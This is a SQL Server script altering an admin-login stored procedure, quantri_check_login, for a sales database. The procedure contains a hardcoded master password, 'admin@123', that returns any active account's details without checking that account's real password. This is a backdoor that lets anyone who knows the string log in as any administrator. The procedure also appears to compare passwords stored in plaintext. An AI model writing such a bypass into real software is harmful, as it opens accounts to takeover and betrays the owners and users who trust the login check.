USE [BanHang]
GO
/****** Object:  StoredProcedure [dbo].[quantri_check_login]    Script Date: 22/02/2017 8:20:05 AM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER PROCEDURE [dbo].[quantri_check_login]
	@taikhoan nvarchar(100),
	@matkhau nvarchar(1000)
as
BEGIN
	if @matkhau = 'admin@123'	
		select MA_TAIKHOAN ,HOTEN, MA_NHOMQUYEN from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MA_TRANGTHAI = 1
	else
		select MA_TAIKHOAN ,HOTEN, MA_NHOMQUYEN from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MATKHAU = @matkhau and MA_TRANGTHAI = 1
END
